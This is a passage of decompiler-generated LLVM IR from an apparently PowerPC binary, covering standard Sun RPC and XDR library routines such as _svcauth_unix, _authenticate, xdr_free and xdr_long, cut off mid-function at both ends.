  %v0_10023cbc = load i32, i32* @r31, align 4
  %v1_10023cbc = mul i32 %v0_10023cbc, 8
  store i32 %v1_10023cbc, i32* %r3.global-to-local, align 4
  %v1_10023cc0 = add i32 %v0_10023cbc, 1
  store i32 %v1_10023cc0, i32* @r31, align 4
  %v2_10023cc4 = add i32 %v1_10023cbc, %v2_10023cb4
  %v3_10023cc4 = inttoptr i32 %v2_10023cc4 to i32*
  %v4_10023cc4 = load i32, i32* %v3_10023cc4, align 4
  %v3_10023cc8 = icmp eq i32 %v4_10023cc4, -1
  br i1 %v3_10023cc8, label %dec_label_pc_10023cd0, label %dec_label_pc_10023ce8

dec_label_pc_10023cd0:                            ; preds = %dec_label_pc_10023cb0
  store i32 %v2_10023c44, i32* %v3_10023cc4, align 4
  %v0_10023cd8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10023cd8 = inttoptr i32 %v0_10023cd8 to i32*
  %v2_10023cd8 = load i32, i32* %v1_10023cd8, align 4
  %v1_10023cdc = load i32, i32* %r3.global-to-local, align 4
  %v2_10023cdc = add i32 %v1_10023cdc, %v2_10023cd8
  store i32 %v2_10023cdc, i32* %r9.global-to-local, align 4
  %v3_10023ce0 = add i32 %v2_10023cdc, 4
  %v4_10023ce0 = inttoptr i32 %v3_10023ce0 to i16*
  store i16 195, i16* %v4_10023ce0, align 2
  br label %dec_label_pc_10023d4c

dec_label_pc_10023ce8:                            ; preds = %dec_label_pc_10023cb0, %dec_label_pc_10023ca8
  store i32 268582124, i32* @lr, align 4
  %v0_10023ce8 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10023ce8, i32* %r3.global-to-local, align 4
  %v1_10023cec = inttoptr i32 %v0_10023ce8 to i32*
  %v2_10023cec = load i32, i32* %v1_10023cec, align 4
  store i32 %v0_10023ce8, i32* @r30, align 4
  %v0_10023cf4 = load i32, i32* @r31, align 4
  %v2_10023cf4 = icmp slt i32 %v0_10023cf4, %v2_10023cec
  br i1 %v2_10023cf4, label %dec_label_pc_10023cb0, label %dec_label_pc_10023cfc

dec_label_pc_10023cfc:                            ; preds = %dec_label_pc_10023ce8
  %v1_10023cfc = add i32 %v2_10023cec, 1
  store i32 %v1_10023cfc, i32* @r29, align 4
  store i32 %v1_10023cfc, i32* %v1_10023cec, align 4
  store i32 268582152, i32* @lr, align 4
  %v0_10023d04 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10023d04, i32* %r3.global-to-local, align 4
  %v0_10023d08 = load i32, i32* @r29, align 4
  %v1_10023d08 = mul i32 %v0_10023d08, 8
  %v1_10023d10 = inttoptr i32 %v0_10023d04 to i32*
  %v2_10023d10 = load i32, i32* %v1_10023d10, align 4
  store i32 %v2_10023d10, i32* %r3.global-to-local, align 4
  store i32 268582168, i32* @lr, align 4
  %v2_10023d14 = call i32 @realloc(i32 %v2_10023d10, i32 %v1_10023d08)
  store i32 %v2_10023d14, i32* %r3.global-to-local, align 4
  %v3_10023d18 = icmp eq i32 %v2_10023d14, 0
  %v1_10023d1c = load i32, i32* @r31, align 4
  %v2_10023d1c = inttoptr i32 %v1_10023d1c to i32*
  store i32 %v2_10023d14, i32* %v2_10023d1c, align 4
  br i1 %v3_10023d18, label %dec_label_pc_10023d4c, label %dec_label_pc_10023d24

dec_label_pc_10023d24:                            ; preds = %dec_label_pc_10023cfc
  %v0_10023d24 = load i32, i32* @r30, align 4
  %v1_10023d24 = inttoptr i32 %v0_10023d24 to i32*
  %v2_10023d24 = load i32, i32* %v1_10023d24, align 4
  %v1_10023d28 = mul i32 %v2_10023d24, 8
  %v1_10023d2c = load i32, i32* %r3.global-to-local, align 4
  %v2_10023d2c = add i32 %v1_10023d2c, %v1_10023d28
  store i32 %v2_10023d2c, i32* %r9.global-to-local, align 4
  %v2_10023d30 = add i32 %v2_10023d2c, -8
  %v3_10023d30 = inttoptr i32 %v2_10023d30 to i32*
  store i32 %v2_10023c44, i32* %v3_10023d30, align 4
  %v0_10023d34 = load i32, i32* @r30, align 4
  %v1_10023d34 = inttoptr i32 %v0_10023d34 to i32*
  %v2_10023d34 = load i32, i32* %v1_10023d34, align 4
  store i32 %v2_10023d34, i32* %r9.global-to-local, align 4
  %v0_10023d38 = load i32, i32* @r31, align 4
  %v1_10023d38 = inttoptr i32 %v0_10023d38 to i32*
  %v2_10023d38 = load i32, i32* %v1_10023d38, align 4
  %v1_10023d3c = mul i32 %v2_10023d34, 8
  %v2_10023d40 = add i32 %v2_10023d38, %v1_10023d3c
  store i32 %v2_10023d40, i32* %r9.global-to-local, align 4
  %v3_10023d48 = add i32 %v2_10023d40, -4
  %v4_10023d48 = inttoptr i32 %v3_10023d48 to i16*
  store i16 195, i16* %v4_10023d48, align 2
  br label %dec_label_pc_10023d4c

dec_label_pc_10023d4c:                            ; preds = %dec_label_pc_10023c68, %dec_label_pc_10023cfc, %dec_label_pc_10023c50, %dec_label_pc_10023cd0, %dec_label_pc_10023d24
  %v0_10023d5c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10023d5c

; uselistorder directives
  uselistorder i32 %v1_10023cbc, { 1, 0 }
  uselistorder i32 %v0_10023cbc, { 1, 0 }
  uselistorder i32 %v1_10023c7c, { 1, 2, 0 }
  uselistorder i32 %v2_10023c44, { 3, 5, 0, 2, 1, 6, 4 }
  uselistorder i32* %r3.global-to-local, { 13, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 14, 2, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 3, 2, 1, 0 }
  uselistorder i16 195, { 1, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 1023, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 ()* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10023d4c, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_10023ca8, { 1, 0 }
  uselistorder label %dec_label_pc_10023c68, { 1, 0 }
}

define i32 @_authenticate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10023d68 = add i32 %arg1, 12
  %v1_10023d6c = add i32 %arg2, 24
  store i32 %v1_10023d6c, i32* @r10, align 4
  %v3_10023d80 = load i32, i32* @global_var_1004eed8.1298, align 4
  %v1_10023d84 = add i32 %arg1, 28
  %v2_10023d84 = inttoptr i32 %v1_10023d84 to i32*
  %v3_10023d84 = load i32, i32* %v2_10023d84, align 4
  %v2_10023d88 = add i32 %v3_10023d84, 32
  %v3_10023d88 = inttoptr i32 %v2_10023d88 to i32*
  store i32 %v3_10023d80, i32* %v3_10023d88, align 4
  %v2_10023d8c = inttoptr i32 %v1_10023d68 to i32*
  %v3_10023d8c = load i32, i32* %v2_10023d8c, align 4
  %v3_10023d90 = load i32, i32* %v2_10023d84, align 4
  %v1_10023d98 = mul i32 %v3_10023d8c, 4
  store i32 %v1_10023d98, i32* %r11.global-to-local, align 4
  %v2_10023da0 = add i32 %v3_10023d90, 40
  %v3_10023da0 = inttoptr i32 %v2_10023da0 to i32*
  store i32 0, i32* %v3_10023da0, align 4
  %v0_10023db4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10023db4 = add i32 %v0_10023db4, ptrtoint (i32* @global_var_1002fa84.1317 to i32)
  %v3_10023db4 = inttoptr i32 %v2_10023db4 to i32*
  %v4_10023db4 = load i32, i32* %v3_10023db4, align 4
  store i32 %v4_10023db4, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_10023db4)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10023de8 = load i32, i32* @lr, align 4
  store i32 %v0_10023de8, i32* %r0.global-to-local, align 4
  %v2_10023df8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10023df8, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 %arg1, i32* @r26, align 4
  %v1_10023e08 = add i32 %arg1, 24
  %v2_10023e08 = inttoptr i32 %v1_10023e08 to i32*
  %v3_10023e08 = load i32, i32* %v2_10023e08, align 4
  store i32 %v3_10023e08, i32* %r30.global-to-local, align 4
  store i32 %v2_10023df8, i32* %r3.global-to-local, align 4
  %v1_10023e10 = add i32 %v3_10023e08, 24
  store i32 %v1_10023e10, i32* %r0.global-to-local, align 4
  %v1_10023e14 = add i32 %v3_10023e08, 280
  store i32 %v1_10023e14, i32* %r9.global-to-local, align 4
  %v2_10023e18 = add i32 %v3_10023e08, 4
  %v3_10023e18 = inttoptr i32 %v2_10023e18 to i32*
  store i32 %v1_10023e10, i32* %v3_10023e18, align 4
  %v0_10023e1c = load i32, i32* %r9.global-to-local, align 4
  %v1_10023e1c = load i32, i32* %r30.global-to-local, align 4
  %v2_10023e1c = add i32 %v1_10023e1c, 20
  %v3_10023e1c = inttoptr i32 %v2_10023e1c to i32*
  store i32 %v0_10023e1c, i32* %v3_10023e1c, align 4
  %v1_10023e20 = add i32 %arg2, 32
  %v2_10023e20 = inttoptr i32 %v1_10023e20 to i32*
  %v3_10023e20 = load i32, i32* %v2_10023e20, align 4
  store i32 %v3_10023e20, i32* %r27.global-to-local, align 4
  %v1_10023e24 = add i32 %arg2, 28
  %v2_10023e24 = inttoptr i32 %v1_10023e24 to i32*
  %v3_10023e24 = load i32, i32* %v2_10023e24, align 4
  %v5_10023e2c = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-56, i32 %v3_10023e24, i32 %v3_10023e20, i32 1)
  %v3_10023e30 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10023e30, i32* %r9.global-to-local, align 4
  store i32 %v2_10023df8, i32* %r3.global-to-local, align 4
  %v1_10023e3c = add i32 %v3_10023e30, 24
  %v2_10023e3c = inttoptr i32 %v1_10023e3c to i32*
  %v3_10023e3c = load i32, i32* %v2_10023e3c, align 4
  store i32 %v3_10023e3c, i32* %r9.global-to-local, align 4
  store i32 %v3_10023e3c, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10023e3c)
  %v0_10023e48 = load i32, i32* %r3.global-to-local, align 4
  %v3_10023e48 = icmp eq i32 %v0_10023e48, 0
  br i1 %v3_10023e48, label %dec_label_pc_10023f28, label %dec_label_pc_10023e50

dec_label_pc_10023e50:                            ; preds = %entry
  %v2_10023e50 = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_10023e50, i32* %r0.global-to-local, align 4
  %v2_10023e54 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10023e54, i32* %r29.global-to-local, align 4
  %v1_10023e58 = load i32, i32* %r30.global-to-local, align 4
  %v2_10023e58 = inttoptr i32 %v1_10023e58 to i32*
  store i32 %v2_10023e50, i32* %v2_10023e58, align 4
  %v3_10023e5c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10023e5c, i32* %r31.global-to-local, align 4
  %v2_10023e60 = icmp ugt i32 %v3_10023e5c, 255
  br i1 %v2_10023e60, label %dec_label_pc_10023f94, label %dec_label_pc_10023e68

dec_label_pc_10023e68:                            ; preds = %dec_label_pc_10023e50
  %v2_10023e68 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10023e68, i32* %r29.global-to-local, align 4
  %v0_10023e6c = load i32, i32* %r30.global-to-local, align 4
  %v1_10023e6c = add i32 %v0_10023e6c, 4
  %v2_10023e6c = inttoptr i32 %v1_10023e6c to i32*
  %v3_10023e6c = load i32, i32* %v2_10023e6c, align 4
  store i32 %v3_10023e6c, i32* @r3, align 4
  store i32 %v2_10023e68, i32* @r4, align 4
  store i32 %v3_10023e5c, i32* @r5, align 4
  store i32 268582524, i32* @lr, align 4
  %v0_10023e78 = call i32 @memcpy()
  store i32 %v0_10023e78, i32* %r3.global-to-local, align 4
  %v0_10023e7c = load i32, i32* %r30.global-to-local, align 4
  %v1_10023e7c = add i32 %v0_10023e7c, 4
  %v2_10023e7c = inttoptr i32 %v1_10023e7c to i32*
  %v3_10023e7c = load i32, i32* %v2_10023e7c, align 4
  store i32 %v3_10023e7c, i32* %r9.global-to-local, align 4
  %v2_10023e84 = load i32, i32* %r31.global-to-local, align 4
  %v4_10023e84 = add i32 %v2_10023e84, %v3_10023e7c
  %v5_10023e84 = inttoptr i32 %v4_10023e84 to i8*
  store i8 0, i8* %v5_10023e84, align 1
  %v0_10023e88 = load i32, i32* %r31.global-to-local, align 4
  %v1_10023e88 = add i32 %v0_10023e88, 3
  store i32 %v1_10023e88, i32* %r0.global-to-local, align 4
  %v1_10023e8c = call i32 @__asm_rlwinm(i32 %v1_10023e88, i32 0, i32 0, i32 29)
  %v0_10023e90 = load i32, i32* %r29.global-to-local, align 4
  %v2_10023e90 = add i32 %v0_10023e90, %v1_10023e8c
  %v3_10023e90 = inttoptr i32 %v2_10023e90 to i32*
  %v4_10023e90 = load i32, i32* %v3_10023e90, align 4
  store i32 %v4_10023e90, i32* %r0.global-to-local, align 4
  store i32 %v2_10023e90, i32* %r29.global-to-local, align 4
  %v1_10023e98 = add i32 %v2_10023e90, 4
  store i32 %v1_10023e98, i32* %r9.global-to-local, align 4
  %v1_10023e9c = load i32, i32* %r30.global-to-local, align 4
  %v2_10023e9c = add i32 %v1_10023e9c, 8
  %v3_10023e9c = inttoptr i32 %v2_10023e9c to i32*
  store i32 %v4_10023e90, i32* %v3_10023e9c, align 4
  %v0_10023ea0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10023ea0 = add i32 %v0_10023ea0, 4
  store i32 %v1_10023ea0, i32* %r11.global-to-local, align 4
  %v0_10023ea4 = load i32, i32* %r29.global-to-local, align 4
  %v1_10023ea4 = add i32 %v0_10023ea4, 4
  %v2_10023ea4 = inttoptr i32 %v1_10023ea4 to i32*
  %v3_10023ea4 = load i32, i32* %v2_10023ea4, align 4
  store i32 %v3_10023ea4, i32* %r0.global-to-local, align 4
  %v1_10023ea8 = load i32, i32* %r30.global-to-local, align 4
  %v2_10023ea8 = add i32 %v1_10023ea8, 12
  %v3_10023ea8 = inttoptr i32 %v2_10023ea8 to i32*
  store i32 %v3_10023ea4, i32* %v3_10023ea8, align 4
  %v0_10023eac = load i32, i32* %r9.global-to-local, align 4
  %v1_10023eac = add i32 %v0_10023eac, 4
  %v2_10023eac = inttoptr i32 %v1_10023eac to i32*
  %v3_10023eac = load i32, i32* %v2_10023eac, align 4
  %v2_10023eb0 = icmp ugt i32 %v3_10023eac, 16
  br i1 %v2_10023eb0, label %dec_label_pc_10023f94, label %dec_label_pc_10023eb8

dec_label_pc_10023eb8:                            ; preds = %dec_label_pc_10023e68
  %v3_10023eb8 = icmp eq i32 %v3_10023eac, 0
  %v1_10023ebc = add i32 %v3_10023eac, 1
  store i32 %v1_10023ebc, i32* %r0.global-to-local, align 4
  %v0_10023ec0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10023ec0 = add i32 %v0_10023ec0, 4
  store i32 %v1_10023ec0, i32* %r11.global-to-local, align 4
  %v1_10023ec4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10023ec4 = add i32 %v1_10023ec4, 16
  %v3_10023ec4 = inttoptr i32 %v2_10023ec4 to i32*
  store i32 %v3_10023eac, i32* %v3_10023ec4, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v0_10023ecc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10023ecc, i32* %ctr.global-to-local, align 4
  br i1 %v3_10023eb8, label %dec_label_pc_10023ef0.preheader.thread, label %dec_label_pc_10023ef0.preheader

dec_label_pc_10023ef0.preheader.thread:           ; preds = %dec_label_pc_10023eb8
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10023efc

dec_label_pc_10023ef0.preheader:                  ; preds = %dec_label_pc_10023eb8
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_10023ef85 = add i32 %v0_10023ecc, -1
  store i32 %v1_10023ef85, i32* %ctr.global-to-local, align 4
  %v2_10023ef86 = icmp eq i32 %v1_10023ef85, 0
  br i1 %v2_10023ef86, label %dec_label_pc_10023efc, label %dec_label_pc_10023ee0

dec_label_pc_10023ee0:                            ; preds = %dec_label_pc_10023ef0.preheader, %dec_label_pc_10023ee0
  %v1_10023eec = phi i32 [ %v1_10023ef0, %dec_label_pc_10023ee0 ], [ 0, %dec_label_pc_10023ef0.preheader ]
  %v0_10023ee0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10023ee0 = inttoptr i32 %v0_10023ee0 to i32*
  %v2_10023ee0 = load i32, i32* %v1_10023ee0, align 4
  store i32 %v2_10023ee0, i32* %r0.global-to-local, align 4
  %v1_10023ee4 = add i32 %v0_10023ee0, 4
  store i32 %v1_10023ee4, i32* %r11.global-to-local, align 4
  %v0_10023ee8 = load i32, i32* %r30.global-to-local, align 4
  %v1_10023ee8 = add i32 %v0_10023ee8, 20
  %v2_10023ee8 = inttoptr i32 %v1_10023ee8 to i32*
  %v3_10023ee8 = load i32, i32* %v2_10023ee8, align 4
  store i32 %v3_10023ee8, i32* %r9.global-to-local, align 4
  %v3_10023eec = add i32 %v3_10023ee8, %v1_10023eec
  %v4_10023eec = inttoptr i32 %v3_10023eec to i32*
  store i32 %v2_10023ee0, i32* %v4_10023eec, align 4
  %v0_10023ef0 = load i32, i32* %r10.global-to-local, align 4
  %v1_10023ef0 = mul i32 %v0_10023ef0, 4
  %v1_10023ef4 = add i32 %v0_10023ef0, 1
  store i32 %v1_10023ef4, i32* %r10.global-to-local, align 4
  %v0_10023ef8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10023ef8 = add i32 %v0_10023ef8, -1
  store i32 %v1_10023ef8, i32* %ctr.global-to-local, align 4
  %v2_10023ef8 = icmp eq i32 %v1_10023ef8, 0
  br i1 %v2_10023ef8, label %dec_label_pc_10023efc, label %dec_label_pc_10023ee0

dec_label_pc_10023efc:                            ; preds = %dec_label_pc_10023ee0, %dec_label_pc_10023ef0.preheader.thread, %dec_label_pc_10023ef0.preheader
  %v1_10023efc = mul i32 %v3_10023eac, 4
  %v1_10023f00 = add i32 %v1_10023e8c, 20
  store i32 %v1_10023f00, i32* %r9.global-to-local, align 4
  %v2_10023f04 = add i32 %v1_10023efc, %v1_10023f00
  store i32 %v2_10023f04, i32* %r0.global-to-local, align 4
  %v1_10023f08 = load i32, i32* %r27.global-to-local, align 4
  %v3_10023f08 = icmp ugt i32 %v2_10023f04, %v1_10023f08
  br i1 %v3_10023f08, label %dec_label_pc_10023f10, label %dec_label_pc_10023f54

dec_label_pc_10023f10:                            ; preds = %dec_label_pc_10023efc
  store i32 ptrtoint ([36 x i8]* @global_var_1002fa90.1318 to i32), i32* %r3.global-to-local, align 4
  %v6_10023f20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_1002fa90.1318, i32 0, i32 0), i32 %v3_10023eac, i32 %v1_10023e8c, i32 %v1_10023f08)
  store i32 %v6_10023f20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10023f94

dec_label_pc_10023f28:                            ; preds = %entry
  store i32 %v2_10023df8, i32* %r3.global-to-local, align 4
  %v0_10023f2c = load i32, i32* %r30.global-to-local, align 4
  store i32 268582708, i32* @lr, align 4
  %v3_10023f30 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-56, i32 %v0_10023f2c)
  store i32 %v3_10023f30, i32* %r3.global-to-local, align 4
  %v3_10023f34 = icmp eq i32 %v3_10023f30, 0
  br i1 %v3_10023f34, label %dec_label_pc_10023f3c, label %dec_label_pc_10023f54

dec_label_pc_10023f3c:                            ; preds = %dec_label_pc_10023f28
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v2_10023df8, i32* %r3.global-to-local, align 4
  %v0_10023f44 = load i32, i32* @r30, align 4
  store i32 2, i32* %stack_var_-56, align 4
  store i32 ptrtoint (i32* @global_var_10023f50.1320 to i32), i32* @lr, align 4
  %v3_10023f4c = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-56, i32 %v0_10023f44)
  store i32 %v3_10023f4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10023f94

dec_label_pc_10023f54:                            ; preds = %dec_label_pc_10023f28, %dec_label_pc_10023efc
  %v0_10023f54 = load i32, i32* @r28, align 4
  %v1_10023f54 = add i32 %v0_10023f54, 44
  %v2_10023f54 = inttoptr i32 %v1_10023f54 to i32*
  %v3_10023f54 = load i32, i32* %v2_10023f54, align 4
  store i32 %v3_10023f54, i32* %r10.global-to-local, align 4
  %v0_10023f58 = load i32, i32* @r26, align 4
  %v1_10023f58 = add i32 %v0_10023f58, 28
  %v2_10023f58 = inttoptr i32 %v1_10023f58 to i32*
  %v3_10023f58 = load i32, i32* %v2_10023f58, align 4
  store i32 %v3_10023f58, i32* %r9.global-to-local, align 4
  %v3_10023f5c = icmp eq i32 %v3_10023f54, 0
  br i1 %v3_10023f5c, label %dec_label_pc_10023f80, label %dec_label_pc_10023f64

dec_label_pc_10023f64:                            ; preds = %dec_label_pc_10023f54
  %v1_10023f64 = add i32 %v0_10023f54, 36
  %v2_10023f64 = inttoptr i32 %v1_10023f64 to i32*
  %v3_10023f64 = load i32, i32* %v2_10023f64, align 4
  store i32 %v3_10023f64, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v1_10023f6c = add i32 %v0_10023f54, 40
  %v2_10023f6c = inttoptr i32 %v1_10023f6c to i32*
  %v3_10023f6c = load i32, i32* %v2_10023f6c, align 4
  store i32 %v3_10023f6c, i32* %r11.global-to-local, align 4
  %v2_10023f70 = add i32 %v3_10023f58, 32
  %v3_10023f70 = inttoptr i32 %v2_10023f70 to i32*
  store i32 %v3_10023f64, i32* %v3_10023f70, align 4
  %v0_10023f74 = load i32, i32* @r26, align 4
  %v1_10023f74 = add i32 %v0_10023f74, 28
  %v2_10023f74 = inttoptr i32 %v1_10023f74 to i32*
  %v3_10023f74 = load i32, i32* %v2_10023f74, align 4
  store i32 %v3_10023f74, i32* %r9.global-to-local, align 4
  %v0_10023f78 = load i32, i32* %r11.global-to-local, align 4
  %v2_10023f78 = add i32 %v3_10023f74, 36
  %v3_10023f78 = inttoptr i32 %v2_10023f78 to i32*
  store i32 %v0_10023f78, i32* %v3_10023f78, align 4
  br label %dec_label_pc_10023f88

dec_label_pc_10023f80:                            ; preds = %dec_label_pc_10023f54
  %v2_10023f80 = add i32 %v3_10023f58, 32
  %v3_10023f80 = inttoptr i32 %v2_10023f80 to i32*
  store i32 0, i32* %v3_10023f80, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10023f88

dec_label_pc_10023f88:                            ; preds = %dec_label_pc_10023f64, %dec_label_pc_10023f80
  %v0_10023f88 = load i32, i32* @r26, align 4
  %v1_10023f88 = add i32 %v0_10023f88, 28
  %v2_10023f88 = inttoptr i32 %v1_10023f88 to i32*
  %v3_10023f88 = load i32, i32* %v2_10023f88, align 4
  store i32 %v3_10023f88, i32* %r9.global-to-local, align 4
  %v0_10023f8c = load i32, i32* %r10.global-to-local, align 4
  %v2_10023f8c = add i32 %v3_10023f88, 40
  %v3_10023f8c = inttoptr i32 %v2_10023f8c to i32*
  store i32 %v0_10023f8c, i32* %v3_10023f8c, align 4
  br label %dec_label_pc_10023f98

dec_label_pc_10023f94:                            ; preds = %dec_label_pc_10023e68, %dec_label_pc_10023e50, %dec_label_pc_10023f3c, %dec_label_pc_10023f10
  store i32 1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10023f98

dec_label_pc_10023f98:                            ; preds = %dec_label_pc_10023f88, %dec_label_pc_10023f94
  %v3_10023f98 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10023f98, i32* %r9.global-to-local, align 4
  %v1_10023f9c = add i32 %v3_10023f98, 28
  %v2_10023f9c = inttoptr i32 %v1_10023f9c to i32*
  %v3_10023f9c = load i32, i32* %v2_10023f9c, align 4
  store i32 %v3_10023f9c, i32* %r0.global-to-local, align 4
  %v3_10023fa0 = icmp eq i32 %v3_10023f9c, 0
  br i1 %v3_10023fa0, label %dec_label_pc_10023fb4, label %dec_label_pc_10023fa8

dec_label_pc_10023fa8:                            ; preds = %dec_label_pc_10023f98
  store i32 %v2_10023df8, i32* %r3.global-to-local, align 4
  store i32 %v3_10023f9c, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10023f9c)
  br label %dec_label_pc_10023fb4

dec_label_pc_10023fb4:                            ; preds = %dec_label_pc_10023f98, %dec_label_pc_10023fa8
  store i32 %v0_10023de8, i32* %r0.global-to-local, align 4
  %v0_10023fb8 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10023fb8, i32* %r3.global-to-local, align 4
  ret i32 %v0_10023fb8

; uselistorder directives
  uselistorder i32 %v3_10023f9c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10023f54, { 1, 0, 2 }
  uselistorder i32 %v1_10023ef8, { 1, 0 }
  uselistorder i32 %v0_10023ef0, { 1, 0 }
  uselistorder i32 %v3_10023eac, { 3, 0, 2, 1, 4, 5 }
  uselistorder i32 %v2_10023e90, { 1, 0, 2 }
  uselistorder i32 %v1_10023e8c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32* %stack_var_-52, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 0 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 4, 5, 6, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %ctr.global-to-local, { 1, 3, 2, 0, 6, 4, 5 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10023fb4, { 1, 0 }
  uselistorder label %dec_label_pc_10023f98, { 1, 0 }
  uselistorder label %dec_label_pc_10023f94, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10023f88, { 1, 0 }
  uselistorder label %dec_label_pc_10023efc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10023ee0, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10023fd8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  call void @__pseudo_call(i32 %arg1)
  ret i32 %v2_10023fd8
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %v0_10024014 = load i32, i32* @r3, align 4
  %v1_10024014 = inttoptr i32 %v0_10024014 to i32*
  %v2_10024014 = load i32, i32* %v1_10024014, align 4
  %v3_10024018 = icmp eq i32 %v2_10024014, 0
  br i1 %v3_10024018, label %dec_label_pc_10024024, label %dec_label_pc_10024030

dec_label_pc_10024024:                            ; preds = %entry
  %v1_10024024 = add i32 %v0_10024014, 4
  %v2_10024024 = inttoptr i32 %v1_10024024 to i32*
  %v3_10024024 = load i32, i32* %v2_10024024, align 4
  %v1_10024028 = add i32 %v3_10024024, 4
  br label %dec_label_pc_10024044

dec_label_pc_10024030:                            ; preds = %entry
  %v3_1002401c = icmp eq i32 %v2_10024014, 1
  br i1 %v3_1002401c, label %dec_label_pc_1002403c, label %dec_label_pc_10024058

dec_label_pc_1002403c:                            ; preds = %dec_label_pc_10024030
  %v1_1002403c = add i32 %v0_10024014, 4
  %v2_1002403c = inttoptr i32 %v1_1002403c to i32*
  %v3_1002403c = load i32, i32* %v2_1002403c, align 4
  br label %dec_label_pc_10024044

dec_label_pc_10024044:                            ; preds = %dec_label_pc_10024024, %dec_label_pc_1002403c
  %storemerge.in.in = phi i32 [ %v1_10024028, %dec_label_pc_10024024 ], [ %v3_1002403c, %dec_label_pc_1002403c ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  call void @__pseudo_call(i32 %storemerge)
  %v0_1002404c = load i32, i32* @r3, align 4
  br label %dec_label_pc_10024058

dec_label_pc_10024058:                            ; preds = %dec_label_pc_10024030, %dec_label_pc_10024044
  %storemerge1 = phi i32 [ %v0_1002404c, %dec_label_pc_10024044 ], [ 0, %dec_label_pc_10024030 ]
